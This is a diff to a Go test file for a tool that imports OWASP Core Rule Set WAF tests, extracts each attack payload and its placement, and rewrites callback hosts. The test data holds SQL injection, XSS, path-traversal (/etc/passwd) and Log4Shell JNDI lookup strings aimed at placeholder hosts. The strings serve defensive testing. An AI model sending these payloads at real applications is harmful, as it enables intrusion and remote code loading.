@@ -110,12 +110,14 @@ func TestAttackStage(t *testing.T) {
 	byID, _ := importFixtures(t)
 	got := byID["942100-1"]
 	want := cases.Line{
-		Name:         "crs-942100-1",
-		Category:     "sqli",
-		Kind:         "attack",
-		Method:       "POST",
-		Path:         "/post",
-		Headers:      map[string]string{"Host": "localhost", "User-Agent": "OWASP CRS test agent", "Accept": "*/*"},
+		Name:     "crs-942100-1",
+		Category: "sqli",
+		Kind:     "attack",
+		Method:   "POST",
+		Path:     "/post",
+		Headers: map[string]string{
+			"Host": "localhost", "User-Agent": "OWASP CRS test agent", "Accept": "*/*", "Connection": "close",
+		},
 		ContentType:  "application/x-www-form-urlencoded",
 		Body:         "id=7%27+OR+%271%27%3D%271",
 		Source:       "crs",
@@ -178,7 +180,8 @@ func TestCallbacksRewritten(t *testing.T) {
 	if got.Headers["Referer"] != "https://callback.invalid/start" {
 		t.Errorf("Referer %q", got.Headers["Referer"])
 	}
-	if got.Body != "next=http://callback.invalid/a" {
+	// The runner escapes this body; the host is rewritten first.
+	if got.Body != "next=http%3A%2F%2Fcallback.invalid%2Fa" {
 		t.Errorf("body %q", got.Body)
 	}
 	// Three parts could carry the attack, so none is named.
@@ -204,7 +207,7 @@ func TestCategory(t *testing.T) {
 		"REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION": "session",
 		"REQUEST-944-APPLICATION-ATTACK-JAVA":             "java",
 		"REQUEST-934-APPLICATION-ATTACK-GENERIC":          "other",
-		"REQUEST-949-BLOCKING-EVALUATION":                 "other",
+		"REQUEST-934":                                     "other",
 		"REQUEST-942":                                     "sqli",
 		"REQUEST-9420-SOMETHING":                          "other",
 		"something-else":                                  "other",
@@ -328,22 +331,25 @@ func TestSkippedStages(t *testing.T) {
 			"Content-Length",
 		},
 		{
-			"multipart without completion",
-			stage{input: "headers:\n  Host: localhost\n  Content-Type: \"multipart/form-data; boundary=b\"\n  Content-Length: 3\n" +
-				"autocomplete_headers: false\ndata: \"a\\nb\"\n"},
-			"multipart",
-		},
-		{
-			"multipart with CRLF",
-			stage{input: "headers:\n  Host: localhost\n  Content-Type: \"multipart/form-data; boundary=b\"\n" +
-				"data: \"--b\\r\\nx\\n--b--\"\n"},
-			"multipart",
-		},
-		{
 			"rewrite changes a stated length",
-			stage{input: "headers:\n  Host: localhost\n  Content-Length: 24\ndata: \"u=http://a.example.com/x\"\n"},
+			stage{input: "headers:\n  Host: localhost\n  Content-Length: 32\ndata: \"u=http://a.example.com/x\"\n"},
 			"Content-Length",
 		},
+		// The upstream runner adds "Content-Length: 0" to these; the sender
+		// does so only for POST, PUT and PATCH.
+		{"DELETE without a body", stage{input: plainHeaders + "method: DELETE\n"}, "Content-Length"},
+		{"method that starts like POST", stage{input: plainHeaders + "method: POSTS\n"}, "Content-Length"},
+		{"method that holds PUT", stage{input: plainHeaders + "method: INPUTS\n"}, "Content-Length"},
+		{"header value starts with a blank", stage{input: "headers:\n  Host: localhost\n  Range: \" bytes=0-1\"\n"}, "blank"},
+		{"header value ends with a tab", stage{input: "headers:\n  Host: localhost\n  Range: \"bytes=0-1\\t\"\n"}, "blank"},
+		{"initialization group", stage{group: "REQUEST-901-INITIALIZATION", input: plainHeaders}, "rule-set mechanics, not an attack"},
+		{"exclusion group", stage{group: "REQUEST-905-COMMON-EXCEPTIONS", input: plainHeaders}, "rule-set mechanics, not an attack"},
+		{"blocking group", stage{group: "REQUEST-949-BLOCKING-EVALUATION", input: plainHeaders}, "rule-set mechanics, not an attack"},
+		{"correlation group", stage{group: "RESPONSE-980-CORRELATION", input: plainHeaders}, "rule-set mechanics, not an attack"},
+		{"last group", stage{group: "REQUEST-999-COMMON-EXCEPTIONS-AFTER", input: plainHeaders}, "rule-set mechanics, not an attack"},
+		{"repeated output field", stage{input: plainHeaders, output: "status: 200\nstatus: 403\nlog:\n  expect_ids: [1]\n"}, "twice"},
+		{"repeated log field", stage{input: plainHeaders, output: "log:\n  expect_ids: [1]\n  expect_ids: []\n"}, "twice"},
+		{"repeated header, same spelling", stage{input: "headers:\n  Host: localhost\n  A: b\n  A: c\n"}, "twice"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -439,7 +445,7 @@ func TestBody(t *testing.T) {
 	t.Run("default content type", func(t *testing.T) {
 		t.Parallel()
 		l := mustImport(t, stage{input: plainHeaders + "method: POST\ndata: \"a=1 2\"\n"})
-		if l.ContentType != "application/x-www-form-urlencoded" || l.Body != "a=1 2" {
+		if l.ContentType != "application/x-www-form-urlencoded" || l.Body != "a=1+2" {
 			t.Errorf("content type %q, body %q", l.ContentType, l.Body)
 		}
 	})
@@ -467,6 +473,21 @@ func TestBody(t *testing.T) {
 			t.Errorf("body %q, want %q", l.Body, want)
 		}
 	})
+	t.Run("multipart line ends are not looked at first", func(t *testing.T) {
+		t.Parallel()
+		// The upstream runner puts a CR before every LF, whatever is there,
+		// with or without header completion, and finds the content type
+		// without regard to case.
+		l := mustImport(t, stage{input: "headers:\n  Host: localhost\n  content-type: \"Multipart/Form-Data; boundary=b\"\n" +
+			"  Content-Length: 12\nautocomplete_headers: false\ndata: \"--b\\r\\nx\\n--b--\"\n"})
+		if want := "--b\r\r\nx\r\n--b--"; l.Body != want {
+			t.Errorf("body %q, want %q", l.Body, want)
+		}
+		l = mustImport(t, stage{input: "headers:\n  Host: localhost\n  Content-Type: multipart/form-data\ndata: \"a\\nb\"\n"})
+		if l.Body != "a\nb" {
+			t.Errorf("body %q, want it unchanged without a boundary parameter", l.Body)
+		}
+	})
 	t.Run("other bodies keep their line ends", func(t *testing.T) {
 		t.Parallel()
 		l := mustImport(t, stage{input: "headers:\n  Host: localhost\n  Content-Type: text/plain\ndata: \"a\\nb\"\n"})
@@ -476,13 +497,18 @@ func TestBody(t *testing.T) {
 	})
 	t.Run("bytes that are not UTF-8", func(t *testing.T) {
 		t.Parallel()
-		l := mustImport(t, stage{input: plainHeaders + "data: !!binary YT3/\n"})
+		l := mustImport(t, stage{input: "headers:\n  Host: localhost\n  Content-Type: application/octet-stream\ndata: !!binary YT3/\n"})
 		got, err := base64.StdEncoding.DecodeString(l.BodyBase64)
 		if err != nil || string(got) != "a=\xff" || l.Body != "" {
 			t.Errorf("body %q, body_base64 %q (%v)", l.Body, l.BodyBase64, err)
 		}
+		// As a form, the runner escapes them.
+		l = mustImport(t, stage{input: plainHeaders + "data: !!binary YT3/Jw==\n"})
+		if l.Body != "a=%FF%27" || l.BodyBase64 != "" {
+			t.Errorf("body %q, body_base64 %q", l.Body, l.BodyBase64)
+		}
 		payload, err := base64.StdEncoding.DecodeString(l.PayloadBase64)
-		if err != nil || string(payload) != "\xff" || l.Payload != "" || l.Placement != "body" {
+		if err != nil || string(payload) != "\xff'" || l.Payload != "" || l.Placement != "body" {
 			t.Errorf("payload %q, payload_base64 %q (%v), placement %q", l.Payload, l.PayloadBase64, err, l.Placement)
 		}
 	})
@@ -506,8 +532,8 @@ func TestFramingHeadersAreKept(t *testing.T) {
 		{"host", "headers:\n  Host: \"example.test:8080\"\n", "Host", "example.test:8080"},
 		{
 			"rewrite keeps the stated length",
-			"headers:\n  Host: localhost\n  Content-Length: 27\ndata: \"u=http://callback.invalid/x\"\n",
-			"Content-Length", "27",
+			"headers:\n  Host: localhost\n  Content-Length: 35\ndata: \"u=http://callback.invalid/x\"\n",
+			"Content-Length", "35",
 		},
 	}
 	for _, tt := range tests {
@@ -529,8 +555,18 @@ func TestWithoutCompletion(t *testing.T) {
 		t.Errorf("method %q, headers %v", l.Method, l.Headers)
 	}
 	l = mustImport(t, stage{input: plainHeaders + "method: POST\nautocomplete_headers: true\ndata: \"a=1\"\n"})
-	if l.ContentType != "application/x-www-form-urlencoded" {
-		t.Errorf("content type %q with completion", l.ContentType)
+	if l.ContentType != "application/x-www-form-urlencoded" || l.Headers["Connection"] != "close" {
+		t.Errorf("content type %q, headers %v with completion", l.ContentType, l.Headers)
+	}
+	l = mustImport(t, stage{input: "headers:\n  Host: localhost\n  connection: keep-alive\n"})
+	if len(l.Headers) != 2 || l.Headers["connection"] != "keep-alive" {
+		t.Errorf("headers %v, want the test's own Connection header only", l.Headers)
+	}
+	// A body-less POST gets "Content-Length: 0" from the runner and from the
+	// sender alike.
+	l = mustImport(t, stage{input: plainHeaders + "method: POST\n"})
+	if _, ok := l.Headers["Content-Length"]; ok || l.Body != "" {
+		t.Errorf("headers %v, body %q", l.Headers, l.Body)
 	}
 }
 
@@ -544,13 +580,22 @@ func TestPayload(t *testing.T) {
 		{"query key alone", "uri: \"/get?%3Cscript%3E\"\n", "<script>", "query"},
 		{"query key with an empty value", "uri: \"/get?%3Cscript%3E=\"\n", "<script>", "query"},
 		{"query with a bad escape", "uri: \"/get?q=100%zz\"\n", "100%zz", "query"},
-		{"two query values", "uri: \"/get?a=1&b=2\"\n", "", ""},
+		{"two query values", "uri: \"/get?a=%3Cb%3E&b=%3Ci%3E\"\n", "", ""},
+		{"filler values", "uri: \"/get?a=1&b=2\"\n", "", ""},
+		{"filler value", "uri: \"/get?var=test\"\n", "", ""},
+		{"filler next to a value", "uri: \"/get?page=1&q=%3Cb%3E&lang=en\"\n", "<b>", "query"},
+		{"attack in a parameter name", "method: POST\ndata: \"java.lang.Object=test\"\n", "java.lang.Object", "body"},
+		{"attack in a query parameter name", "uri: \"/get?%24%7Bjndi%3Ax%7D=value\"\n", "${jndi:x}", "query"},
+		{"name and value both unusual", "uri: \"/get?a%5B%24ne%5D=%3Cb%3E\"\n", "", ""},
+		{"long plain value", "uri: \"/get?q=abcdefghijklmnopqrstuvwxyz\"\n", "abcdefghijklmnopqrstuvwxyz", "query"},
 		{"form value", "method: POST\ndata: \"q=%3Cb%3E\"\n", "<b>", "body"},
-		{"two form values", "method: POST\ndata: \"q=1&r=2\"\n", "", ""},
-		{"query and form", "method: POST\nuri: \"/post?a=1\"\ndata: \"q=1\"\n", "", ""},
+		{"two form values", "method: POST\ndata: \"q=%3Cb%3E&r=%3Ci%3E\"\n", "", ""},
+		{"query and form", "method: POST\nuri: \"/post?a=%3Cb%3E\"\ndata: \"q=%3Ci%3E\"\n", "", ""},
+		{"form encoded by the runner", "method: POST\ndata: \"q=1' or 1=1\"\n", "1' or 1=1", "body"},
 		{"path", "uri: \"/get/..%2f..%2fetc/passwd\"\n", "/get/../../etc/passwd", "path"},
 		{"plain path", "uri: \"/get/index.php\"\n", "", ""},
-		{"path and query", "uri: \"/get/../x?q=1\"\n", "", ""},
+		{"path and query", "uri: \"/get/../x?q=%3Cb%3E\"\n", "", ""},
+		{"path and a filler", "uri: \"/get/../x?q=1\"\n", "/get/../x", "path"},
 	}
 	for _, tt := range tests {
 		l := mustImport(t, stage{input: "headers:\n  Host: localhost\n" + agent + tt.input})
@@ -562,12 +607,25 @@ func TestPayload(t *testing.T) {
 	headerTests := []struct {
 		name, headers, rest, payload, placement string
 	}{
-		{"one other header", agent + "  Cookie: \"a=${jndi:x}\"\n", "", "a=${jndi:x}", "header"},
+		{"cookie value", agent + "  Cookie: \"a=${jndi:x}\"\n", "", "${jndi:x}", "header"},
+		{"cookie value among fillers", "  Cookie: \"sid=abc123; a=%3Cb%3E; theme=dark\"\n", "", "<b>", "header"},
+		{"cookie name", "  Cookie: \"<b>=1\"\n", "", "<b>", "header"},
+		{"cookie with a plus", "  Cookie: \"a=1+or+%271\"\n", "", "1+or+'1", "header"},
+		{"two cookie values", "  Cookie: \"a=<b>; c=<i>\"\n", "", "", ""},
 		{"another user agent", "  User-Agent: sqlmap/1.0\n", "", "sqlmap/1.0", "header"},
-		{"two other headers", "  Cookie: a=1\n  Referer: b\n", "", "", ""},
-		{"header and query", "  Cookie: a=1\n", "uri: \"/get?q=1\"\n", "", ""},
-		{"JSON body", "  Content-Type: application/json\n", "data: '{\"q\": \"1\"}'\n", "", ""},
+		{"other header", "  X-Api-Version: \"1 or 1=1\"\n", "", "1 or 1=1", "header"},
+		{"other header with a filler", "  X-Api-Version: v2\n", "", "", ""},
+		{"two other headers", "  Cookie: a=<b>\n  Referer: \"<i>\"\n", "", "", ""},
+		{"header and query", "  Cookie: a=<b>\n", "uri: \"/get?q=<i>\"\n", "", ""},
+		{"attack in a boilerplate header", agent + "  Accept-Language: \"en'; drop table users--\"\n", "", "en'; drop table users--", "header"},
+		{"attack in the content type", "  Content-Type: \"text/plain; charset=${jndi:x}\"\n", "", "text/plain; charset=${jndi:x}", "header"},
+		{"ordinary boilerplate", agent + "  Accept-Language: \"en-us,en;q=0.5\"\n  Keep-Alive: 300\n  Cache-Control: \"no-cache, no-store\"\n", "uri: \"/get?q=<b>\"\n", "<b>", "query"},
+		{"JSON body", "  Content-Type: application/json\n", "data: '{\"q\": \"<b>\"}'\n", "", ""},
 		{"form body with parameters", "  Content-Type: \"Application/X-WWW-Form-Urlencoded; charset=utf-8\"\n", "data: \"q=a+b\"\n", "a b", "body"},
+	}
+	l := mustImport(t, stage{input: "headers:\n  Host: \"localhost'--\"\n"})
+	if l.Payload != "localhost'--" || l.Placement != "header" {
+		t.Errorf("attack in the host: payload %q in %q", l.Payload, l.Placement)
 	}
 	for _, tt := range headerTests {
 		l := mustImport(t, stage{input: "headers:\n  Host: localhost\n" + tt.headers + tt.rest})
@@ -626,6 +684,12 @@ func TestBadTestsDoNotStopTheImport(t *testing.T) {
 		"notes.txt":      "not a test file",
 		"941600.yaml":    "a: &a [x, x]\nb: &b [*a, *a]\nc: &c [*b, *b]\nrule_id: 941600\ntests: *c\n",
 		"sub/941700.yml": "rule_id: 941700\ntests:\n  - test_id: 1\n" + good,
+		"941900.yaml": "rule_id: 941900\ntests:\n  - test_id: 1\n" + good +
+			"---\nrule_id: 941901\ntests:\n  - test_id: 1\n" + good,
+		"942000.yaml": "rule_id: 942000\nrule_id: 942001\ntests:\n  - test_id: 1\n" + good,
+		"942100.yaml": "rule_id: 942100\ntests:\n  - test_id: 1\n    test_id: 2\n" + good +
+			"  - test_id: 3\n" + good + good,
+		"942200.yaml": "rule_id: 942200\ntests:\n  - test_id: 1\n" + good + "---\n[unclosed\n",
 	}
 	for name, content := range files {
 		path := filepath.Join(dir, filepath.FromSlash(name))
@@ -653,7 +717,7 @@ func TestBadTestsDoNotStopTheImport(t *testing.T) {
 	for _, l := range lines {
 		ids = append(ids, l.SourceCaseID)
 	}
-	if got, want := strings.Join(ids, " "), "941100-1 941100-7 941500-1 941700-1"; got != want {
+	if got, want := strings.Join(ids, " "), "941100-1 941100-7 941500-1 941900-1 942200-1 941700-1"; got != want {
 		t.Errorf("imported %q, want %q", got, want)
 	}
 	const group = "REQUEST-941-APPLICATION-ATTACK-XSS/"
@@ -667,6 +731,12 @@ func TestBadTestsDoNotStopTheImport(t *testing.T) {
 		group + "941300.yaml":   "tests",
 		group + "941400.yaml":   "mapping",
 		group + "941600.yaml":   "tests",
+		group + "941800.yaml":   "link is not followed",
+		group + "941900.yaml":   "document",
+		group + "942000.yaml":   "twice",
+		group + "942100.yaml#1": "twice",
+		group + "942100.yaml#2": "twice",
+		group + "942200.yaml":   "document",
 	}
 	got := map[string]string{}
 	for _, s := range skipped {
@@ -714,6 +784,105 @@ func TestImportFailsWithoutTests(t *testing.T) {
 		if err == nil || lines != nil || skipped != nil {
 			t.Errorf("%s: %d lines, %d skips, error %v; want an error only", name, len(lines), len(skipped), err)
 		}
+	}
+}
+
+// The payload decides the held-out split: the same attack must give the same
+// payload wherever the test puts it.
+func TestPayloadIsTheSameInQueryFormAndCookie(t *testing.T) {
+	t.Parallel()
+	const want = "${jndi:ldap://callback.invalid/a}"
+	inputs := map[string]string{
+		"query":           plainHeaders + "uri: \"/get?a=%24%7Bjndi:ldap://x.example.com/a%7D\"\n",
+		"form, escaped":   plainHeaders + "data: \"b=%24%7Bjndi%3Aldap%3A%2F%2Fx.example.com%2Fa%7D\"\n",
+		"form, as text":   plainHeaders + "data: \"c=${jndi:ldap://x.example.com/a}\"\n",
+		"cookie":          "headers:\n  Host: localhost\n  Cookie: \"d=${jndi:ldap://x.example.com/a}\"\n",
+		"cookie, escaped": "headers:\n  Host: localhost\n  Cookie: \"sid=1; e=%24%7Bjndi:ldap://x.example.com/a%7D\"\n",
+		"other header":    "headers:\n  Host: localhost\n  X-Api-Version: \"${jndi:ldap://x.example.com/a}\"\n",
+		"parameter name":  plainHeaders + "uri: \"/get?%24%7Bjndi:ldap://x.example.com/a%7D=1\"\n",
+	}
+	var first cases.Case
+	for name, input := range inputs {
+		l := mustImport(t, stage{input: input})
+		if l.Payload != want {
+			t.Errorf("%s: payload %q, want %q", name, l.Payload, want)
+			continue
+		}
+		c, err := cases.FromLine(l)
+		if err != nil {
+			t.Fatal(err)
+		}
+		// One payload, so every case is in the same set.
+		if first.ID == "" {
+			first = c
+		} else if cases.Split(c) != cases.Split(first) {
+			t.Errorf("%s: split %s, want %s", name, cases.Split(c), cases.Split(first))
+		}
+	}
+}
+
+// In these groups the tested part is the framing of the request, and the one
+// value that looks like a payload is incidental.
+func TestNoPayloadInProtocolGroups(t *testing.T) {
+	t.Parallel()
+	for _, group := range []string{
+		"REQUEST-911-METHOD-ENFORCEMENT", "REQUEST-920-PROTOCOL-ENFORCEMENT",
+		"REQUEST-921-PROTOCOL-ATTACK", "REQUEST-922-MULTIPART-ATTACK",
+	} {
+		l := mustImport(t, stage{group: group, input: plainHeaders + "uri: \"/get?q=%3Cscript%3E\"\n"})
+		if l.Payload != "" || l.PayloadBase64 != "" || l.Placement != "" {
+			t.Errorf("%s: payload %q in %q, want none", group, l.Payload, l.Placement)
+		}
+	}
+	l := mustImport(t, stage{group: "REQUEST-930-APPLICATION-ATTACK-LFI", input: plainHeaders + "uri: \"/get?q=%3Cscript%3E\"\n"})
+	if l.Payload != "<script>" {
+		t.Errorf("payload %q in another group", l.Payload)
+	}
+}
+
+// What the upstream runner (ftwhttp.encodeDataParameters) does to a body.
+func TestFormBodyIsEncodedAsTheRunnerDoes(t *testing.T) {
+	t.Parallel()
+	const form = "headers:\n  Host: localhost\n  Content-Type: application/x-www-form-urlencoded\n"
+	tests := []struct {
+		name, headers, data, want string
+	}{
+		{"text", plainHeaders, `"var=1234 OR 1=1"`, "var=1234+OR+1%3D1"},
+		{"quotes and brackets", plainHeaders, `"a=<b>&c='d'"`, "a=%3Cb%3E&c=%27d%27"},
+		{"name is encoded too", plainHeaders, `"a b[]=1"`, "a+b%5B%5D=1"},
+		{"no equals sign", plainHeaders, `"a b&c"`, "a+b&c"},
+		{"empty parts", plainHeaders, `"a=1&&b=2"`, "a=1&&b=2"},
+		{"one final ampersand is lost", plainHeaders, `"a=1&"`, "a=1"},
+		{"two final ampersands", plainHeaders, `"a=1&&"`, "a=1&"},
+		{"semicolon and non-ASCII", plainHeaders, `"a=1;b=\u00e9"`, "a=1%3Bb%3D%C3%A9"},
+		{"already escaped", plainHeaders, `"a=1%20OR 2"`, "a=1%20OR 2"},
+		{"a plus sign", plainHeaders, `"a=1+OR 2"`, "a=1+OR 2"},
+		{"a bad escape", plainHeaders, `"a=100% sure"`, "a=100% sure"},
+		{"content type given", form, `"a=1 2"`, "a=1+2"},
+		{"content type in other letters", "headers:\n  Host: localhost\n  content-type: Application/X-WWW-Form-Urlencoded\n", `"a=1 2"`, "a=1+2"},
+		{"content type with a parameter", "headers:\n  Host: localhost\n  Content-Type: \"application/x-www-form-urlencoded; charset=utf-8\"\n", `"a=1 2"`, "a=1 2"},
+		{"another content type", "headers:\n  Host: localhost\n  Content-Type: text/plain\n", `"a=1 2"`, "a=1 2"},
+		{"no completion", form + "  Content-Length: 5\nautocomplete_headers: false\n", `"a=1 2"`, "a=1 2"},
+	}
+	for _, tt := range tests {
+		l := mustImport(t, stage{input: tt.headers + "method: POST\ndata: " + tt.data + "\n"})
+		if l.Body != tt.want {
+			t.Errorf("%s: body %q, want %q", tt.name, l.Body, tt.want)
+		}
+	}
+}
+
+// Whether the runner encodes a body depends on the test's data, not on the
+// data after its callback hosts were rewritten.
+func TestCallbackRewriteDoesNotChangeTheEncoding(t *testing.T) {
+	t.Parallel()
+	l := mustImport(t, stage{input: plainHeaders + "data: \"u=http://a.example.com/x\"\n"})
+	if l.Body != "u=http%3A%2F%2Fcallback.invalid%2Fx" {
+		t.Errorf("body %q", l.Body)
+	}
+	l = mustImport(t, stage{input: plainHeaders + "data: \"u=http://ex%61mple.com/x y\"\n"})
+	if l.Body != "u=http://callback.invalid/x y" {
+		t.Errorf("body %q, want it rewritten and otherwise as written", l.Body)
 	}
 }
 
